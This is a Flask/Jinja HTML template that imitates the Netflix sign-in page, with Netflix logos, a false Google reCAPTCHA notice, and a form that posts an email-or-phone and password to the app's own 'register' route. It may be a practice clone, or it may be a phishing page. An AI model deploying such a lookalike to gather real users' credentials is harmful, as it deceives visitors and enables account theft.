<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix Sign In</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='malito.css') }}">
  <link rel="icon" href="{{ url_for('static', filename='images/netflixtoptoplogo.jpeg') }}">
</head>
<body>
  <div class="header">
    <nav>
      <img src="{{ url_for('static', filename='images/netflix-logo 2.png') }}" alt="logo" class="logo"> 
    </nav>
    <div class="kuingia">
      <h1>Sign In</h1>

      <!-- Flash Messages -->
      {% with messages = get_flashed_messages() %}
        {% if messages %}
          <div class="flash-messages">
            <ul>
              {% for message in messages %}
                <li>{{ message }}</li>
              {% endfor %}
            </ul>
          </div>
        {% endif %}
      {% endwith %}

      <!-- Registration Form -->
      <form method="POST" action="{{ url_for('register') }}">
        <input type="text" name="username" placeholder="Email or Phone Number" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Sign In">
        <div class="form-options">
          <input type="checkbox" name="remember_me" id="checkbox">
          <label for="checkbox">Remember Me</label>
          <a href="#">Need Help?</a>
        </div>
      </form>

      <!-- Footer Info -->
      <div class="contente">
        <h2>New to Netflix? <a href="{{ url_for('home') }}">Sign Up now.</a></h2>
        <h2>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</h2>
      </div>
    </div>
  </div>  
</body>
</html>
